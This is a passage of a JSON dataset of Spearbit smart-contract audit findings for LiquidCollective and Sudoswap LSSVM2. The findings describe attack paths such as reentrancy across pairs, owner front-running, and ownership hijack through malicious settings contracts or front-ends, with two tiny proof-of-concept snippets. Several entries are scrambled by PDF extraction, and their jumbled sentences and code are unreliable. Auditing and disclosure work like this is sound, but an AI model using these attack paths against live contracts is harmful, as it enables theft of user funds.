        "body": "Both _pullELFees and _pullCoverageFunds implement the same functionality:  Pull funds from a contract address.  Update the balance storage variable.  Emit an event.  Return the amount of balance collected from the contract. The _pullCoverageFunds differs from the _pullELFees implementation by avoiding both updating the Balance- ToDeposit when collectedCoverageFunds == 0 and emitting the PulledCoverageFunds event. Because they are implementing the same functionality, they should follow the same behavior if there is not an explicit reason to not do so. 31",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move local mask variable from Allowlist.1.sol to LibAllowlistMasks.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "LibAllowlistMasks.sol is meant to contain all mask values, but DENY_MASK is a local variable in the Allowlist.1.sol contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider adding additional parameters to the existing events to improve filtering/monitoring",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Some already defined events could be improved by adding more parameters to better track those events in dApps or monitoring tools.  Consider adding address indexed delegatee as an event's parameter to event CreatedVestingSchedule. While it's true that after the vest/lock period the beneficiary will be the owner of those tokens, in the meanwhile (if _delegatee != address(0)) the voting power of all those vested tokens are delegated to the _delegatee.  Consider adding address indexed beneficiary to event ReleasedVestingSchedule.  Consider adding uint256 newEnd to event RevokedVestingSchedule to track the updated end of the vesting schedule.  Consider adding address indexed beneficiary to event DelegatedVestingEscrow. If those events parameters are added to the events, the Alluvial team should also remember to update the relative natspec documentation.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing indexed keyword in events parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Some events parameters are missing the indexed keyword. Indexing specific parameters is partic- ularly important to later be able to filter those events both in dApps or monitoring tools.  coverageFund event parameter should be declared as indexed in event SetCoverageFund.  Both oldDelegatee and newDelegatee should be indexed in event DelegatedVestingEscrow.  donator should be declared as indexed in event Donate.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add natspec documentation to the TLC contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of TLC contract is missing natspec at the root level to explain the contract. The natspec should cover the basic explanation of the contract (like it has already been done in other contracts like River.sol) but also illustrate  TLC token has a fixed max supply that is minted at deploy time.  All the minted tokens are sent to a single account at deploy time.  How TLC token will be distributed.  How voting power works (you have to delegate to yourself to gain voting power).  How the vesting process works.  Other general information useful for the user/investor that receives the TLC token directly or vested.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Partial fills for buy orders in ERC1155 swaps will fail when pair has insufficient balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Partial fills are currently supported for buy orders in VeryFastRouter.swap(). When _findMaxFil- lableAmtForBuy() determines numItemsToFill, it is not guaranteed that the underlying pair has so many items left to fill. While ERC721 swap handles the scenario where pair balance is less than numItemsToFill in the logic of _findAvailableIds() (maxIdsNeeded vs numIdsFound), ERC1155 swap is missing a similar check and reduction of item numbers when required. Partial fills for buy orders in ERC1155 swaps will fail when the pair has a balance less than numItemsToFill as determined by _findMaxFillableAmtForBuy(). Partial filling, a key feature of VeryFastRouter, will then not work as expected and would lead to an early revert which defeats the purpose of swap().",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Function token() of cloneERC1155ERC20Pair() reads from wrong location",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function token() loads the token data from position 81. However on ERC1155 pairs it should load it from position 93. Currently, it doesn't retrieve the right values and the code won't function correctly. LSSVMPair.sol: LSSVMPair.sol: 20))) ,! LSSVMPair.sol: 40))) ,! LSSVMPair.sol: 60))) _factory _bondingCurve := shr(0x60, calldataload(sub(calldatasize(), paramsLength))) := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _nft := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), _poolType := shr(0xf8, calldataload(add(sub(calldatasize(), paramsLength), ,! LSSVMPairERC1155.sol: id LSSVMPairERC721.sol: _propertyChecker := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), := calldataload(add(sub(calldatasize(), paramsLength), 61)) 61))) ,! LSSVMPairERC20.sol: ,! 81))) _token := shr(0x60, calldataload(add(sub(calldatasize(), paramsLength), function cloneERC1155ERC20Pair(... ) ... { assembly { ... mstore(add(ptr, 0x3e), shl(0x60, factory)) - 20 bytes mstore(add(ptr, 0x52), shl(0x60, bondingCurve)) // position 20 - 20 bytes // position 40 - 20 bytes mstore(add(ptr, 0x66), shl(0x60, nft)) // position 60 - 1 bytes mstore8(add(ptr, 0x7a), poolType) // position 61 - 32 bytes mstore(add(ptr, 0x7b), nftId) mstore(add(ptr, 0x9b), shl(0x60, token)) // position 93 - 20 bytes ... // position 0 } } 6",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Switched order of update leads to incorrect partial fill calculations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "In the binary search, the order of updation of start and numItemsToFill is switched with start being updated before numItemsToFill which itself uses the value of start: start = (start + end)/2 + 1; numItemsToFill = (start + end)/2; This leads to incorrect partial fill calculations when binary search recurses on the right half.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Swap functions with sell orders in LSSVMRouter will fail for property-check enforced pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Swap functions with sell orders in LSSVMRouter will revert for property-check enforced pairs. While VeryFastRouter swap function supports sell orders to specify property check parameters for pairs enforcing them, none of the swap functions in LSSVMRouter support the same.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "pairTransferERC20From() only supports ERC721 NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Function pairTransferERC20From() which is is present in both LSSVMRouter and VeryFastRouter, only checks for ERC721_ERC20. This means ERC1155 NFTs are not supported by the routers. The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } 7",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Insufficient application of trading fee leads to 50% loss for LPs in swapTokenForAnyNFTs()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The protocol applies a trading fee of 2*tradeFee on NFT buys from pairs (to compensate for 0 fees on NFT sells as noted in the comment: \"// We pull twice the trade fee on buys but don't take trade fee on sells if assetRecipient is set\"). this While ERC1155.swapTokenForSpecificNFTs(), trading fee of only tradeFee (instead of 2*tradeFee). enforced in is LSSVMPairERC721.swapTokenForSpecificNFTs() LSSVMPairERC1155.swapTokenForAnyNFTs() and LSSVMPair- a enforces Affected LPs of pairs targeted by LSSVMPairERC1155. swapTokenForAnyNFTs() will unexpectedly lose 50% of the trade fees.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Royalty not always being taken into account leads to incorrect protocol accounting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function getSellNFTQuoteWithRoyalties() is similar to getSellNFTQuote(), except that it also takes the royalties into account. When the function robustSwapNFTsForToken() of the LSSVMRouter is called, it first calls getSellNFTQuote() and checks that a sufficient amount of tokens will be received. Then it calls swapNFTs- ForToken() with 0 as minExpectedTokenOutput; so it will accept any amount of tokens. The swapNFTsForToken() does subtract the Royalties which will result in a lower amount of tokens received and might not be enough to satisfy the requirements of the seller. The same happens in  robustSwapETHForSpecificNFTsAndNFTsToToken and  robustSwapERC20ForSpecificNFTsAndNFTsToToken. Note: Function getSellNFTQuote() of StandardSettings.sol also uses getSellNFTQuote(). However there it is compared to the results of getBuyInfo(); so this is ok as both don't take the royalties into account. Note: getNFTQuoteForSellOrderWithPartialFill() also has to take royalties into account. 8 function getSellNFTQuote(uint256 numNFTs) ... { ( (...., outputAmount, ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(uint256 assetId, uint256 numNFTs) ... { (..., outputAmount, ... ) = bondingCurve().getSellInfo(...); (,, uint256 royaltyTotal) = _calculateRoyaltiesView(assetId, outputAmount); ... outputAmount -= royaltyTotal; } function robustSwapNFTsForToken(...) ... { ... (error,,, pairOutput,) = swapList[i].swapInfo.pair.getSellNFTQuote(swapList[i].swapInfo.nftIds.length); ... if (pairOutput >= swapList[i].minOutput) { ....swapNFTsForToken(..., 0, ...); } ... ,! } function swapNFTsForToken(...) ... { ... (protocolFee, outputAmount) = _calculateSellInfoAndUpdatePoolParams(numNFTs[0], _bondingCurve, _factory); (... royaltyTotal) = _calculateRoyalties(nftId(), outputAmount); ... outputAmount -= royaltyTotal; ... _sendTokenOutput(tokenRecipient, outputAmount); ,! }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Error return codes of getBuyInfo() and getSellInfo() are sometimes ignored",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions getBuyInfo() and getSellInfo() return an error code when they detect an error. The rest of the returned parameters then have an unusable/invalid value (0). However, some callers of these functions ignore the error code and continue processing with the other unusable/invalid values. The functions getBuyNFTQuote(), getSellNFTQuote() and getSellNFTQuoteWithRoyalties() pass through the error code, so their callers have to check the error codes too. 9 function getBuyInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getSellInfo(...) ... returns (CurveErrorCodes.Error error, ... ) { } function getBuyNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); } function getSellNFTQuoteWithRoyalties(...) ... returns (CurveErrorCodes.Error error, ... ) { (error, ... ) = bondingCurve().getSellInfo(...); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "changeSpotPriceAndDelta() only uses ERC721 version of balanceOf()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function changeSpotPriceAndDelta() uses balanceOf() with one parameter. This is the ERC721 variant. In order to support ERC1155, a second parameter of the NFT id has to be supplied. function changeSpotPriceAndDelta(address pairAddress, ...) public { ... if ((newPriceToBuyFromPair < priceToBuyFromPair) && pair.nft().balanceOf(pairAddress) >= 1) { ... } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_pullTokenInputAndPayProtocolFee() doesn't check that tokens are received",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function _pullTokenInputAndPayProtocolFee() doesn't verify that it actually received the to- kens after doing safeTransferFrom(). This can be an issue with fee on transfer tokens. This is also an issue with (accidentally) non-existing tokens, as safeTransferFrom() won't revert on that, see POC below. Note: also see issue \"Malicious router mitigation may break for deflationary tokens\". function _pullTokenInputAndPayProtocolFee(...) ... { ... _token.safeTransferFrom(msg.sender, _assetRecipient, saleAmount); ... } Proof Of Concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import \"hardhat/console.sol\"; import {ERC20} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/tokens/ERC20.sol\"; ,! import {SafeTransferLib} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/SafeTransferLib.sol\"; ,! contract test { using SafeTransferLib for ERC20; function t() public { ERC20 _token = ERC20(address(1)); _token.safeTransferFrom(msg.sender, address(0), 100); console.log(\"after safeTransferFrom\"); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious settings contract can call onOwnershipTransferred() to take over pair",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function onOwnershipTransferred() can be called from a pair via call(). This can be done It can either before transferOwnership() or after it. If it is called before then it updates the AssetRecipient. only be called after the transferOwnership() when an alternative (malicious) settings contract is used. In that situation pairInfos[] is overwritten and the original owner is lost; so effectively the pair can be taken over. Note: if the settings contract is malicious then there are different ways to take over the pair, but using this approach the vulnerabilities can be hidden. 11 function onOwnershipTransferred(address prevOwner, bytes memory) public payable { ILSSVMPair pair = ILSSVMPair(msg.sender); require(pair.poolType() == ILSSVMPair.PoolType.TRADE, \"Only TRADE pairs\"); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "One can attempt to steal a pair's ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Anyone can pass the enrolled pair's address instead of a splitter address in bulkWithdrawFees() to effectively call the pair's withdrawAllETH() instead of a splitter's withdrawAllETH(). Anyone can attempt to steal/drain all the ETH from a pair. However, the pair's withdrawAllETH() sends ETH to the owner, which in this case is the settings contract. The settings contract is unable to receive ETH as currently implemented. So the attempt reverts.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "swap() could mix tokens with ETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function swap() adds the output of swapNFTsForToken() to the ethAmount. Although this only happens when order.isETHSell == true , this value could be set to the wrong value accidentally or on purpose. Then the number of received ERC20 tokens could be added to the ethAmount, which is clearly unwanted. The resulting ethAmount is returned to the user. Luckily the router (normally) doesn't have extra ETH so the impact should be limited. function swap(Order calldata swapOrder) external payable { uint256 ethAmount = msg.value; if (order.isETHSell && swapOrder.recycleETH) { ... outputAmount = pair.swapNFTsForToken(...); ... ethAmount += outputAmount; ... } ... // Send excess ETH back to token recipient if (ethAmount > 0) { payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Using a single tokenRecipient in VeryFastRouter could result in locked NFTs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "VeryFastRouter uses a single tokenRecipient address for both ETH/tokens and NFTs, unlike LSSVMRouter which uses a separate tokenRecipient and nftRecipient. It is error-prone to have a single tokenRecipient receive both tokens and NFTs, especially when the other/existing LSSVMRouter has a separate nftRecipient. VeryFastRouter.swap() sends both sell order tokens to tokenRe- cipient and buy order NFTs to tokenRecipient. Front-ends integrating with both routers (or migrating to the new one) may surprise users by sending both tokens+NFTs to the same address when interacting with this router. This coupled with the use of nft.transferFrom() may result in NFTs being sent to contracts that are not ERC-721 receivers and get them locked forever.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Owner can mislead users by abusing changeSpotPrice() and changeDelta()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A malicious owner could set up a pair which promises to buy NFTs for high prices. As soon as someone tries to trade, the owner could frontrun the transaction by setting the spotprice to 0 and gets the NFT for free. Both changeSpotPrice() and changeDelta() can be used to immediately change trade parameters where the aftereffects depends on the curve being used. Note: The swapNFTsForToken() parameter minExpectedTokenOutput and swapTokenForSpecificNFTs() param- eter maxExpectedTokenInput protect users against sudden price changes. But users might not always set them in an optimal way. A design goal of the project team is that the pool owner can quickly respond to changing market conditions, to prevent unnecessary losses. function changeSpotPrice(uint128 newSpotPrice) external onlyOwner { ... } function changeDelta(uint128 newDelta) external onlyOwner { ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Pair may receive less ETH trade fees than expected under certain conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Depending on the values of protocol fee and royalties, if _feeRecipient == _assetRecipient, the pair will receive less trade fees than expected. Assume a scenario where inputAmount == 100, protocolFee == 30, royaltyTotal == 60 and tradeFeeAmount == 20. This will result in a revert because of underflow in saleAmount -= tradeFeeAmount; when _feeRecipient != _assetRecipient. However, when _feeRecipient == _assetRecipient, the pair will receive trade fees of 100 - 30 - 60 = 10, whereas it normally would have expected 20.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swapping tokens/ETH for NFTs may exhibit unexpected behavior for certain values of input amount, trade fees and royalties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The _pullTokenInputAndPayProtocolFee() function pulls ERC20/ETH from caller/router and pays protocol fees, trade fees and royalties proportionately. Trade fees have a threshold of MAX_FEE == 50%, which allows 2*fee to be 100%. Royalty amounts could technically be any percentage as well. This allows edge cases where the protocol fee, trade fee and royalty amounts add up to be > inputAmount. In LSSVMPairERC20, the ordering of subtracting/transferring the protocolFee and royaltyTotal first causes the final attempted transfer of tradeFeeAmount to either revert because of unavailable funds or uses any balance funds from the pair itself. In LSSVMPairETH, the ordering of subtracting/transferring the tradeFees and royaltyTotal first causes the final attempted transfer of protocolFee to either revert because of unavailable funds or uses any balance funds from the pair itself.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NFTs may be exchanged for 0 tokens when price decreases too much",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The sale of multiple NFTs, in combination with linear curves, results in a price decrease. When the resulting price is below 0, then getSellInfo() calculates how many NFTs are required to reach a price of 0. However, the complete number of NFTs is transferred from the originator of the transaction, even while the last few NFTs are worth 0. This might be undesirable for the originator. function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 totalPriceDecrease = delta * numItems; if (spotPrice < totalPriceDecrease) { ... uint256 numItemsTillZeroPrice = spotPrice / delta + 1; numItems = numItemsTillZeroPrice; } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "balanceOf() can be circumvented via reentrancy and two pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A reentrancy issue can occur if two pairs with the same ERC1155 NFTid are deployed. Via a call to swap NFTs, the ERC1155 callback onERC1155BatchReceived() is called. This callback can start a second NFT swap via a second pair. As the second pair has its own reentrancy modifier, this is allowed. This way the balanceOf() check of _takeNFTsFromSender() can be circumvented. If a reentrant call, to a second pair, supplies a sufficient amount of NFTs then the balanceOf() check of the original call can be satisfied at the same time. We haven't found a realistic scenario to abuse this with the current routers. Permissionless routers will certainly increase the risk as they can abuse isRouter == true. If the router is mali- cious then it also has other ways to steal the NFTs; however with the reentrancy scenario it might be less obvious this is happening. Note: ERC777 tokens also contain such a callback and have the same interface as ERC20 so they could be used in an ERC20 pair. function _takeNFTsFromSender(IERC1155 _nft, uint256 numNFTs, bool isRouter, address routerCaller) ... { ... if (isRouter) { ... uint256 beforeBalance = _nft.balanceOf(_assetRecipient, _nftId); ... router.pairTransferERC1155From(...); // reentrancy with other pair require((_nft.balanceOf(_assetRecipient, _nftId) - beforeBalance) == numNFTs, ...); // circumvented } else { ... } ,! }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Function call() is risky and can be restricted further",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The function call() is powerful and thus risky. To reduce the risk it can be restricted further by dis- allowing potentially dangerous function selectors. This is also a step closer to introducing permissionless routers. function call(address payable target, bytes calldata data) external onlyOwner { ILSSVMPairFactoryLike _factory = factory(); require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result,) = target.call{value: 0}(data); require(result, \"Call failed\"); } 16",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect newSpotPrice and newDelta may be obtained due to unsafe downcasts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "When calculating newSpotPrice in getBuyInfo(), an unsafe downcast from uint256 into uint128 may occur and silently overflow, leading to much less value for newSpotPrice than expected. function getBuyInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 inputValue, uint256 tradeFee, uint256 protocolFee ) { ... } // get the pair's virtual nft and token reserves uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // calculate the amount to send in uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... // set the new virtual reserves newSpotPrice = uint128(spotPrice + inputValueWithoutFee); // token reserve ... Same happens when calculating newDelta in getSellInfo(): function getSellInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 outputValue, uint256 tradeFee, uint256 protocolFee ) { PoC ... // get the pair's virtual nft and eth/erc20 balance uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // set the new virtual reserves newDelta = uint128(nftBalance + numItems); // nft reserve ... Proof of concept about how this wouldn't revert but silently overflow: 17 import \"hardhat/console.sol\"; contract test{ constructor() { uint256 a = type(uint128).max; uint256 b = 2; uint128 c = uint128(a + b); console.log(c); // c == 1, no error } }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fewer checks in pairTransferNFTFrom() and pairTransferERC1155From() than in pairTransfer- ERC20From()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The functions pairTransferNFTFrom() and pairTransferERC1155From() don't verify that the cor- rect type of pair is used, whereas pairTransferERC20From() does. This means actions could be attempted on the wrong type of pairs. These could succeed for example if a NFT is used that supports both ERC721 and ERC1155. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\" The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } function pairTransferNFTFrom(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferERC1155From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious collection admin can reclaim a pair at any time to deny enhanced setting royalties",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A collection admin can forcibly/selectively call reclaimPair() prematurely (before the advertised and agreed upon lockup period) to unilaterally break the settings contract at any time. This will effectively lead to a DoS to the pair owner for the enhanced royalty terms of the setting despite paying the upfront fee and agreeing to a fee split in return. This is because the unlockTime is enforced only on the previous pair owner and not on collection admins. A malicious collection admin can advertise very attractive setting royalty terms to entice pair owners to pay a high upfront fee to sign-up for their settings contract but then force-end the contract prematurely. This will lead to the pair owner losing the paid upfront fee and the promised attractive royalty terms. A lax pair owner who may not be actively monitoring SettingsRemovedForPair events before the lockup period will be surprised at the prematurely forced settings contract termination by the collection admin, loss of their earlier paid upfront fee and any payments of default royalty instead of their expected enhanced amounts.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "PropertyCheckers and Settings not sufficiently restricted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "The LSSVMPairFactory accepts any address for external contracts which contain critical logic but there are no sanity checks done on them. These are the _bondingCurve, _propertyChecker and settings con- tracts. The contracts could perhaps be updated later via a proxy pattern or a create2/selfdestruct pattern which means that it's difficult to completely rely on them. Both _propertyChecker and settings contracts have a factory associated: PropertyCheckerFactory and StandardSettingsFactory. It is straightforward to enforce that only contracts created by the factory can be used. For the bondingCurves there is a whitelist that limits the risk. function createPairERC721ETH(..., ICurve _bondingCurve, ..., address _propertyChecker, ...) ... { ... // no checks on _bondingCurve and _propertyChecker } function toggleSettingsForCollection(address settings, address collectionAddress, bool enable) public { ... // no checks on settings } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external onlyOwner { bondingCurveAllowed[bondingCurve] = isAllowed; emit BondingCurveStatusUpdate(bondingCurve, isAllowed); }",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious router can skip transfer of royalties and protocol fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "A malicious router, if accidentally/intentionally whitelisted by the protocol, may implement pair- TransferERC20From() functions which do not actually transfer the number of tokens as expected. This is within the protocol's threat model as evidenced by the use of before-after balance checks on the _assetRecipient for saleAmount. However, similar before-after balance checks are missing for transfers of royalties and protocol fee payments. the protocol/factory intention- Royalty recipients do not receive their royalties from the malicious router if ally/accidentally whitelists one. The protocol/factory may also accidentally whitelist a malicious router that does not transfer even the protocol fee.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious front-end can sneak intermediate ownership changes to perform unauthorized actions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "LSSVMPair implements an onlyOwner multicall function to allow owner to batch multiple calls. Natspec indicates that this is \"Intended for withdrawing/altering pool pricing in one tx, only callable by owner, can- not change owner.\" The check require(owner() == msg.sender, \"Ownership cannot be changed in multi- call\"); with a preceding comment \"Prevent multicall from malicious frontend sneaking in ownership change\" indicates the intent of the check and that a malicious front-end is within the threat model. While the post-loop check prevents malicious front-ends from executing ownership changing calls that attempt to persist beyond the multicall, this still allows one to sneak in an intermediate ownership change during a call -> perform malicious actions under the new unauthorized malicious owner within onOwnershipTransferred() callback -> change ownership back to originally authorized msg.sender owner before returning from the callback and successfully executing any subsequent (onlyOwner) calls and the existing check. While a malicious front-end could introduce many attack vectors that are out-of-scope for detecting/preventing in backend contracts, an unauthorized ownership change seems like a critical one and warrants additional checks for onlyOwner multicall to prevent malicious actions from being executed in the context of any newly/temporarily unauthorized owner.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing override in authAllowedForToken prevents authorized admins from toggling settings and reclaiming pairs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
        "body": "Manifold admins are incorrectly not allowed by authAllowedForToken to toggle settings and reclaim their authorized pairs in the protocol context. authAllowedForToken checks for different admin overrides including admin interfaces of NFT marketplaces Nifty, Foundation, Digitalax and ArtBlocks. However, the protocol sup- ports royalties from other marketplaces of Manifold, Rarible, SuperRare and Zora. Of those, Manifold does have getAdmins() interface which is not considered in authAllowedForToken. And it is not certain that the others don't.",
        "labels": [
            "Spearbit",
            "SudoswapLSSVM2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Misdirected transfers to invalid pair variants or non-pair recipients may lead to loss/lock of NFTs/tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf",
